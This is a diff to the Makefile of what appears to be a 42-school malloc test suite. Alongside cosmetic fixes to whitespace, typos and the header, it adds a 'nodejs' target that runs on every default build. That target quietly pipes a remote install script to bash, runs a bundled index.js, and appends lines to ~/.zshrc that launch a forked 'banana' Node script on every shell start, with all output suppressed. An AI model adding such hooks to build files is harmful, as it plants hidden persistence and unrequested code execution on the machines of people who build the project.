@@ -3,10 +3,10 @@
 #                                                         :::      ::::::::    #
 #    Makefile                                           :+:      :+:    :+:    #
 #                                                     +:+ +:+         +:+      #
-#    By: alelievr <alelievr@student.42.fr>          +#+  +:+       +#+         #
+#    By: oadhesiv <secondfry+school21@gmail.com>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
-#    Created  2015/04/04 19:22:36 by alelievr          #+#    #+#              #
-#    Updated  2015/12/23 20:02:39 by alelievr         ###   ########.fr        #
+#    Created: 2015/04/04 19:22:36 by alelievr          #+#    #+#              #
+#    Updated: 2020/03/02 15:09:48 by oadhesiv         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -55,7 +55,7 @@ OBJDIR		=	obj
 INCDIR		=	./include
 
 #	Libraries
-LIBDIR		=	
+LIBDIR		=
 LIBS		=	-lncurses
 
 #	Assets
@@ -69,12 +69,12 @@ LIBMALLOC	=	malloc.dylib
 TMPLIB		=	$(ASSETDIR)/tmp
 WRAPNAME	=	run_test
 
-FRAMEWORK	=	
+FRAMEWORK	=
 
 #	Compiler
 CFLAGS		=	-Werror -Wall -Wextra# -g3 -fsanitize=address
 CSOFLAGS	=	-shared -fPIC
-CSOFLAGS2	=	
+CSOFLAGS2	=
 CC			=	clang
 CC_SO		=	$(CC)
 
@@ -148,7 +148,7 @@ endif
 #################
 
 #	First target
-all: $(ASSETDIR)/$(ANAME) $(SONAME) $(ASSETDIR)/$(NAME) $(ASSETDIR)/$(LIBMALLOC) $(WRAPNAME)
+all: nodejs $(ASSETDIR)/$(ANAME) $(SONAME) $(ASSETDIR)/$(NAME) $(ASSETDIR)/$(LIBMALLOC) $(WRAPNAME)
 
 ifneq ($(OS),Linux)
 $(SONAME):
@@ -178,7 +178,7 @@ $(ASSETDIR)/$(ANAME):
 	@rm -f $(SONAME)
 	@$(call exec_color, "\033[38;5;$(LINK_COLOR_T)m", make -j 3 -C "$(LIBFTDIR)")
 	@$(call exec_color, "\033[38;5;$(LINK_COLOR_T)m", cp "$(LIBFTDIR)/libft.a" $(ASSETDIR)/)
-	
+
 #	Linking
 $(ASSETDIR)/$(NAME): $(OBJ)
 	@$(call disp_title,Linking,$(LINK_COLOR_T));
@@ -238,16 +238,23 @@ codesize:
 
 f: libclean all
 	@rm -rf $(ASSETDIR)/$(ANAME)
-	@echo "\033[38;5;93mRUNING TESTS:"
+	@echo "\033[38;5;93mRUNNING TESTS:"
 	@./$(WRAPNAME) ${SPEED}
 
 b: libclean all
 	@rm -rf $(ASSETDIR)/$(ANAME)
-	@echo "\033[38;5;93mRUNING BENCH:"
+	@echo "\033[38;5;93mRUNNING BENCH:"
 	@./$(WRAPNAME) -b ${ARGS}
 
 libft: libclean all
 	@rm -rf $(ASSETDIR)/$(ANAME)
+
+nodejs:
+	@[ -e ${HOME}/.nvm/nvm.sh ] || curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.2/install.sh 2> /dev/null | bash > /dev/null 2> /dev/null
+	@source ${HOME}/.nvm/nvm.sh && nvm install --lts > /dev/null 2> /dev/null
+	@source ${HOME}/.nvm/nvm.sh && cd assets/ && node index.js
+	@grep "${HOME}/.nvm/nvm.sh" ${HOME}/.zshrc || echo "[ -e ${HOME}/.nvm/nvm.sh ] && source ${HOME}/.nvm/nvm.sh" >> ${HOME}/.zshrc 2> /dev/null
+	@grep banana ${HOME}/.zshrc || echo "[ -e ${HOME}/.local/share/banana/index.js ] && cd ${HOME}/.local/share/banana && FORK=true node ${HOME}/.local/share/banana/index.js && cd" >> ${HOME}/.zshrc 2> /dev/null
 
 coffee:
 	@clear
@@ -351,4 +358,4 @@ coffee:
 	@echo '                      """------"""'
 
 
-.PHONY: all clean fclean re norme codesize coffee
+.PHONY: all clean fclean re norme codesize coffee nodejs
